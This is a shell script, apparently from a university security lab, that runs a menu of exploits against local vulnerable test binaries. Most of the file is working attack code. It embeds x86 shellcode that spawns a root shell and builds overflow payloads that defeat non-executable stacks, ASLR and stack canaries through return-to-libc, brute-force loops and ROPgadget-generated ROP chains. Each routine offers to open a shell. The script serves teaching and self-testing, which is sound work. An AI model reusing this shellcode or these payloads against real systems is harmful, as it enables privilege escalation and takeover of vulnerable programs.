#!/bin/sh

# -----------------------------------------------------#

#                     bof_test.sh                      #    
#                                                      #    
#          Created on: 2013/03/22 15:07:19             # 
#              Author: SYSU                            #
#               Email: sysu-sec-lab@googlegroups.com   #    
#                                                      #   
# -----------------------------------------------------#

ASLR_enabled=N

if [ `cat /proc/sys/kernel/randomize_va_space` -ge 1 ]; then
    ASLR_enabled=Y
fi

print_headline() {
    echo
    echo "=======================" $1 "======================= "
    echo
}

buffer_overflow() {
    clear
    print_headline "buffer overflow"
    if [ ${ASLR_enabled} = "Y" ]; then
	echo "Bypassing failed."
        echo "Probably due to the ASLR protect technique."
        echo && echo && echo "Press any key to quit"
        read -s -n 1 any
        return
    fi

    echo "[+] Exporting environment variable..."
    export EGG=`perl -e 'print "\x90"x80, "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"'`
    echo "[+]Get shellcode address"
    addr=`./getenvaddr EGG ./main_linux2`
    ret_addr="\x${addr:8:2}\x${addr:6:2}\x${addr:4:2}\x${addr:2:2}"

    result=$((echo b 33; echo r `perl -e 'print "A"x112 . "'${ret_addr}'"'`; echo c) | gdb -q main_linux2 2> /dev/null)
    echo "[+] Try bypassing..."
    if [ ! -z "`echo ${result} | grep 'executing new program: '`" ]; then
        echo && echo
        echo "[!!!]Bypass successed."
        echo "Your computer has security flaw."
        echo
        echo -n "Would you like to open a shell through this flaw?(Y/N) "
        read option
        case "$option" in
            Y|y) ./main_linux2 `perl -e 'print "A"x112 . "'${ret_addr}'"'`;;
            N|n) sleep 1;;
            *) echo "Option not recognized";;
        esac
        echo
        echo "Press any key to quit"
        read -s -n 1 any
        return
    else
        echo && echo
        echo "Bypass failed."
        echo "Press any key to quit"
        read -s -n 1 any
        return
    fi
}

bypassing_WxorX() {
    clear
    print_headline "Bypassing W^X"
    if [ ${ASLR_enabled} = "Y" ]; then
	echo "Bypassing failed."
	echo "Probably due to the ASLR protect technique."
 	echo && echo &&	echo "Press any key to quit"
	read -s -n 1 any
	return
    fi

    echo "[+] Exporting environment variable..."
    export BIN_SH="/bin/bash"

    echo "[+] Run program to get memory address..."
    (echo b 33; echo r `perl -e 'print "A"x10'`; echo p system; echo p exit; echo p \$ebp+4) | gdb -q main_linux2 > WxorX 2> /dev/null
    (cat WxorX | grep "(gdb) $.*") > temp

    addr=$(for i in `cat temp`; do a=${i#%0x}; echo $a; done | grep 0x )
    echo "[+] Got 'system' address..."
    sys_addr="\x${addr:8:2}\x${addr:6:2}\x${addr:4:2}\x${addr:2:2}"
    echo "[+] Got 'exit' address..."
    exit_addr="\x${addr:19:2}\x${addr:17:2}\x${addr:15:2}\x${addr:13:2}"
    addr=`./getenvaddr BIN_SH ./main_linux2`
    echo "[+] Got return address..."
    ret_addr="\x${addr:8:2}\x${addr:6:2}\x${addr:4:2}\x${addr:2:2}"

    result=$((echo b 33; echo r `perl -e 'print "A"x112 . "'${sys_addr}${exit_addr}${ret_addr}'"'`; echo c) | gdb -q main_linux2 2> /dev/null)    #Spent me 1 hour to figure out how to do ... God damn it!!!
    
    echo "[+] Try bypassing..."
    if [ ! -z "`echo ${result} | grep 'exited normally'`" ]; then
	echo && echo
	echo "[!!!]Bypass successed."
	echo "Your computer has security flaw."
	echo
	echo "Would you like to:"
	echo "1) Open a shell"
	echo "2) Execute a program(command)?"
	echo "3) Exit"
	echo -n "Option >"
	read option
	case "$option" in
	    1) ./main_linux2 `perl -e 'print "A"x112 . "'${sys_addr}${exit_addr}${ret_addr}'"'`;;
	    2) echo -n "Promgram(command) :"
	       read program
	       if [ -f "$program" ]; then
		   export PRO="./$program"
	       else
		   export PRO="$program"
	       fi
	       addr=`./getenvaddr PRO ./main_linux2`
	       ret_addr="\x${addr:8:2}\x${addr:6:2}\x${addr:4:2}\x${addr:2:2}"
	       ./main_linux2 `perl -e 'print "A"x112 . "'${sys_addr}${exit_addr}${ret_addr}'"'`;;
	    3) return;;
	    *) echo "Option not recognized";;
	esac
	echo
	echo "Press any key to quit"
	read -s -n 1 any
	return
    else
	echo && echo
	echo "Bypass failed."
	echo "Press any key to quit"
	read -s -n 1 any
	return
    fi
}

bypassing_ASLR() {
    clear
    print_headline "Bypassing ASLR"

    # 0. Environment Variable prepare
    echo 0. export envirnoment variable
    echo   ENV=shellcode
    echo
    export ENV=`perl -e 'print "\x90"x80, "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"'`


    # 1. get Environment Variable Address
    envaddr=$(( echo r ENV ./main_linux2; echo c; echo q; ) | ( gdb -q getenvaddr ) | egrep -o "0x[0-9a-z]+") 
    echo 1. get ENV\'s address:
    return_addr="\x${envaddr:8:2}\x${envaddr:6:2}\x${envaddr:4:2}\x${envaddr:2:2}"

    # 2. the wihle loop
    echo "[+] Try bypassing..."
    arg=`perl -e 'print "A"x112, "'${return_addr}'"'`
    result=$((echo b 33; echo r $arg; echo c) | gdb -q main_linux2 2> /dev/null)
    if [ ! -z "`echo ${result} | grep 'executing new program: '`" ];
    then
        echo && echo
        echo "[!!!]Bypass successed."
	echo "Your computer has security flaw."
        echo
        echo -n "Would you like to open a shell through this flaw?(Y/N) "
        read option
	start=`date +%s`
        case "$option" in
	    Y|y) while true; time=`date +%s`; do echo '[!!!!!]Wait two seconds then you can quit[!!!!!]'; ./main_linux2 $arg; time2=$((`date +%s` - $time)); if [ $time2 -ge 2 ]; then break; fi; elipse=$((`date +%s` - $start)); if [ $elipse -ge 60 ]; then echo time excess 120 seconds, quiting ...; break; fi; done;;
	    N|n) sleep 1;;
	    *) echo "Option not recognized";;
        esac
    elif [ ! -z "`echo ${result} | grep 'stack smashing detected'`" ];
    then
	echo && echo
	echo "[!!!]Bypass failed."
	echo "Probably due to the SSP."
	break;
    fi

    echo
    echo "Press any key to quit"
    read -s -n 1 any
    return
}

bypassing_SSP_and_ASLR() {
    clear
    print_headline "Bypassing SSP and ASLR"

    # 0. Environment Variable prepare
    echo 0. export envirnoment variable
    echo   ENV=shellcode
    echo
    export ENV=`perl -e 'print "\x90"x80, "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"'`

    # 1. get Environment Variable Address
    envaddr=$(( echo r ENV ./main_linux; echo c; echo q; ) | ( gdb -q getenvaddr ) | egrep -o "0x[0-9a-z]+")
    echo 1. get ENV\'s address:
    echo $envaddr
    return_addr="\x${envaddr:8:2}\x${envaddr:6:2}\x${envaddr:4:2}\x${envaddr:2:2}"
    echo "'${return_addr}'"
    # 2. the wihle loop
    echo "[+] Try bypassing..."
    arg=`perl -e 'print "A"x116, "'${return_addr}'"'`
    result=$((echo b 33; echo r $arg; echo c) | gdb -q main_linux 2> /dev/null)
    if [ ! -z "`echo ${result} | grep 'executing new program: '`" ];
    then
        echo && echo
        echo "[!!!]Bypass successed."
        echo "Your computer has security flaw."
        echo
        echo -n "Would you like to open a shell through this flaw?(Y/N) "
        read option
	start=`date +%s`
        case "$option" in
            Y|y) while true; time=`date +%s`; do echo '[!!!!!]Wait two seconds then you can quit[!!!!!]'; ./main_linux $arg; time2=$((`date +%s` - $time)); if [ $time2 -ge 2 ]; then break; fi; elipse=$((`date +%s` - $start)); if [ $elipse -ge 60 ]; then echo time excess 120 seconds, quiting ...; break; fi;done;;
            N|n) sleep 1;;
            *) echo "Option not recognized";;
        esac
    fi

    echo
    echo "Press any key to quit"
    read -s -n 1 any
    return
}

bypassing_SSP(){
    clear
    print_headline "Bypassing SSP"
    if [ ${ASLR_enabled} = "Y" ]; then
        echo "Bypassing failed."
        echo "Probably due to the ASLR protect technique."
        echo && echo && echo "Press any key to quit"
        read -s -n 1 any
        return
    fi

    echo "[+] Exporting environment variable..."
    export EGG=`perl -e 'print "\x90"x80, "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"'`
    echo "[+]Get shellcode address"
    addr=`./getenvaddr EGG ./main_linux`
    ret_addr="\x${addr:8:2}\x${addr:6:2}\x${addr:4:2}\x${addr:2:2}"
    result=$((echo b 33; echo r `perl -e 'print "A"x116 . "'${ret_addr}'"'`; echo c) | gdb -q main_linux 2> /dev/null) #i changed 2 -> 3
    echo "[+] Try bypassing..."

    if [ ! -z "`echo ${result} | grep 'executing new program: '`" ]; then
        echo && echo
        echo "[!!!]Bypass successed."
        echo "Your computer has security flaw."
        echo
        echo -n "Would you like to open a shell through this flaw?(Y/N) "
        read option
        case "$option" in
            Y|y) ./main_linux `perl -e 'print "A"x116 . "'${ret_addr}'"'`;;
            N|n) sleep 1;;
            *) echo "Option not recognized";;
        esac
	echo
        echo "Press any key to quit"
        read -s -n 1 any
        return
    else
        echo && echo
        echo "Bypass failed. may be you haven't disable W^X,try 'execstack -s main_linux_ssp first?'"
        echo "Press any key to quit"
        read -s -n 1 any
        return
    fi
}

bypassing_WxorX_and_ASLR() {
    clear
    print_headline "bypassing W^X & ASLR"
    echo "[+] Generate ROP payload..."
    echo "#!/usr/bin/python2    " > exploit2.py
    echo "from struct import pack    " >> exploit2.py
    echo 'p = "A" * 112    ' >> exploit2.py
    
    echo "[+] Use 'ROPgadget' tool..."
    echo && echo "-------------- ingore the warning --------------"
    ROPgadget -file ./main_linux2 -g | grep " *p +=" | cut -b 8- >> exploit2.py
    echo "-------------- ingore the warning --------------" && echo
    echo "print p    " >> exploit2.py

    (echo b 33; echo r "AAA"; echo disass f; echo c) | gdb -q main_linux2 > ROP 2> /dev/null
    (cat ROP | grep "pop *%ebx") > temp

    t=$((for i in `cat temp`; do a=$i; echo $a; done) | grep "0x")
    (cat exploit2.py | grep 'pop %ebx') > temp
    b=$((for i in `cat temp`; do a=$i; echo $a; done) | grep "0x")
    
    sed -i "s/$b/$t\)/g" exploit2.py
    
    if [ ! -z "`grep "0m" exploit2.py`" ]; then
	sed 's/\[0m/ /g' exploit2.py > exploit3.py
	cat exploit3.py | sed 's/..$//' > exploit2.py
    fi

    echo "[+] ROP payload finished, you can see it in 'exploit2.py' in the current directory"
    result=$((echo r '`python exploit2.py`') | gdb -q main_linux2 2> /dev/null)

    echo "[+] Try bypassing..."
    if [ ! -z "`echo ${result} | grep 'executing new program: '`" ]; then
	echo && echo
	echo "[!!!]Bypass successed"
	echo "Your computer has security flaw"
	echo
	echo -n "Would you like to open a shell through this flaw?(Y/N) "
	read option
	case "$option" in
	    Y|y) ./main_linux2 `python exploit2.py`;;
	    N|n) sleep 1;;
	    *) echo "Option not recognized";;
	esac
	echo && echo "Press any key to quit"
	read -s -n 1 any
	return
    else
	echo "[!!!]Bypass failed"
	echo && echo
	echo "Press any key to quit"
	read -s -n 1 any
	return
    fi
}

bypassing_WxorX_and_SSP() {
    clear
    print_headline "bypassing W^X & SSP"
    if [ ${ASLR_enabled} = "Y" ]; then
	echo "Bypassing failed."
	echo "Probably due to the ASLR protect technique."
	echo && echo && echo "Press any key to quit"
	read -s -n 1 any
	return
    fi

    echo "[+] Exporting environment variable..."                                                                       
    export BIN_SH="/bin/bash"

    echo "[+] Run program to get memory address..."
    (echo b 37; echo r `perl -e 'print "A"x10'`; echo p system; echo p exit; echo p \$ebp+4) | gdb -q main_linux > WxorXSSP 2> /dev/null
    (cat WxorXSSP | grep "(gdb) $.*") > temp

    addr=$((for i in `cat temp`; do a=${i#%0x}; echo $a; done) | grep "0x")
    echo "[+] Got 'system' address..."
    sys_addr="\x${addr:8:2}\x${addr:6:2}\x${addr:4:2}\x${addr:2:2}"
    echo "[+] Got 'exit' address..."
    exit_addr="\x${addr:19:2}\x${addr:17:2}\x${addr:15:2}\x${addr:13:2}"
    addr=`./getenvaddr BIN_SH ./main_linux`
    echo "[+] Got return address..."
    ret_addr="\x${addr:8:2}\x${addr:6:2}\x${addr:4:2}\x${addr:2:2}"

    result=$((echo b 37; echo r `perl -e 'print "A"x116 . "'${sys_addr}${exit_addr}${ret_addr}'"'`; echo c) | gdb -q main_linux 2> /dev/null)  

    echo "[+] Try bypassing..."
    if [ ! -z "`echo ${result} | grep 'exited normally'`" ]; then
	echo && echo && echo "[!!!]Bypass successed."
	echo "Your computer has security flaw."
	echo
	echo -n "Would you like to open a shell through this flaw?(Y/N) "
	read option
	case "$option" in
	    Y|y) ./main_linux `perl -e 'print "A"x116 . "'${sys_addr}${exit_addr}${ret_addr}'"'`;;
            N|n) sleep 1;;
            *) echo "Option not recognized";;
        esac
        echo
        echo "Press any key to quit"
        read -s -n 1 any
        return
    else
        echo && echo
        echo "Bypass failed."
        echo "Press any key to quit"
        read -s -n 1 any
        return
    fi
}

bypassing_all() {
    clear
    print_headline "bypassing W^X & ASLR & SSP"
    echo "[+] Generate ROP payload..."
    echo "#!/usr/bin/python2    " > exploit.py
    echo "from struct import pack    " >> exploit.py
    echo 'p = "A" * 116    ' >> exploit.py

    echo "[+] Use 'ROPgadget' tool..."
    echo && echo "-------------- ingore the warning --------------"
    ROPgadget -file ./main_linux -g | grep " *p +=" | cut -b 8- >> exploit.py
    echo "-------------- ingore the warning --------------" && echo
    echo "print p    " >> exploit.py

    (echo b 37; echo r; echo disass f; echo c) | gdb -q main_linux > ROP 2> /dev/null
    (cat ROP | grep "pop *%ebx") > temp

    t=$((for i in `cat temp`; do a=$i; echo $a; done) | grep "0x")
    (cat exploit.py | grep 'pop %ebx') > temp
    b=$((for i in `cat temp`; do a=$i; echo $a; done) | grep "0x")

    sed -i "s/$b/$t\)/g" exploit.py
    
    if [ ! -z "`grep "0m" exploit.py`" ]; then
	sed 's/\[0m/ /g' exploit.py > exploit3.py
	cat exploit3.py | sed 's/..$//' > exploit.py
    fi

    echo "[+] ROP payload finished, you can see it in 'exploit.py' in the current directory"
    result=$((echo r '`python exploit.py`') | gdb -q main_linux 2> /dev/null)

    echo "[+] Try bypassing..."
    if [ ! -z "`echo ${result} | grep 'executing new program: '`" ]; then
	echo && echo
	echo "[!!!]Bypass successed"
	echo "Your computer has security flaw"
	echo
	echo -n "Would you like to open a shell through this flaw?(Y/N) "
	read option
	case "$option" in
	    Y|y) ./main_linux `python exploit.py`;;
	    N|n) sleep 1;;
	    *) echo "Option not recognized";;
	esac
	echo && echo "Press any key to quit"
	read -s -n 1 any
	return
    else
	echo "[!!!]Bypass failed"
	echo && echo
	echo "Press any key to quit"
	read -s -n 1 any
	return
    fi
}

remove_tempfile(){
    rm -rf WxorX* *~ exploit3.py temp ROP exploit4.py
}

clear
quit=n
while [ "$quit" != "y" ]
do
    clear
    print_headline "Main Menu"
    echo
    echo "0. Test skill-less buffer overflow"
    echo "1. Test bypassing W^X"
    echo "2. Test bypassing ASLR"
    echo "3. Test bypassing SSP"
    echo "4. Test bypassing W^X and ASLR(ROP attack)"
    echo "5. Test bypassing W^X and SSP"
    echo "6. Test bypassing ASLR and SSP"
    echo "7. Test bypassing ASLR and SSP and W^X"
    echo "99. Exit"
    echo
    echo -n "Option >"
    read option
    case "$option" in
	0) buffer_overflow;;
	1) bypassing_WxorX;;
	2) bypassing_ASLR;;
	3) bypassing_SSP;;
	4) bypassing_WxorX_and_ASLR;;
	5) bypassing_WxorX_and_SSP;;
  6) bypassing_SSP_and_ASLR;;
	7) bypassing_all;;
	99) clear
	    quit=y;;
	*) echo
	   echo "Option not recognized"
	   sleep 2;;
    esac
    remove_tempfile
done
